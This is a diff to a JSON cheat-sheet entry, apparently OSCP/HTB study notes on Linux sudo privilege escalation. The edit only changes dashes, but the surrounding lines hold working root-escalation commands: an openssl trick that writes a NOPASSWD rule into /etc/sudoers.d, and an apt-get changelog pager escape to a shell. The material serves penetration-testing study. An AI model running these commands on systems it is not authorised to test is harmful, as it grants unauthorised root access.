@@ -30,11 +30,11 @@
       "command": "echo \"htb-student ALL=(ALL) NOPASSWD:ALL\" | base64 | sudo /usr/bin/openssl enc -d -a -out /etc/sudoers.d/htb-student"
     },
     {
-      "label": "OSCP Ch17 — apt-get GTFOBins escape: changelog spawns less, then shell",
+      "label": "OSCP Ch17 - apt-get GTFOBins escape: changelog spawns less, then shell",
       "command": "sudo apt-get changelog apt\n# In the pager, type:\n!/bin/sh"
     }
   ],
-  "notes": "sudo -l is the first thing to run on any box. A single NOPASSWD binary is usually enough - check it on GTFOBins. The openssl trick writes a NOPASSWD line into /etc/sudoers.d when openssl is sudo-allowed. OSCP Ch17: apt-get changelog opens less; type !/bin/sh inside less to escape to root shell. Always check GTFOBins for every binary in 'sudo -l'. AppArmor may block tcpdump sudo escape even when it's listed — check /var/log/syslog for apparmor=DENIED. Also covered in: OSCP PEN-200 Chapter 17 (Linux Privilege Escalation).",
+  "notes": "sudo -l is the first thing to run on any box. A single NOPASSWD binary is usually enough - check it on GTFOBins. The openssl trick writes a NOPASSWD line into /etc/sudoers.d when openssl is sudo-allowed. OSCP Ch17: apt-get changelog opens less; type !/bin/sh inside less to escape to root shell. Always check GTFOBins for every binary in 'sudo -l'. AppArmor may block tcpdump sudo escape even when it's listed - check /var/log/syslog for apparmor=DENIED. Also covered in: OSCP PEN-200 Chapter 17 (Linux Privilege Escalation).",
   "references": [
     {
       "title": "GTFOBins",
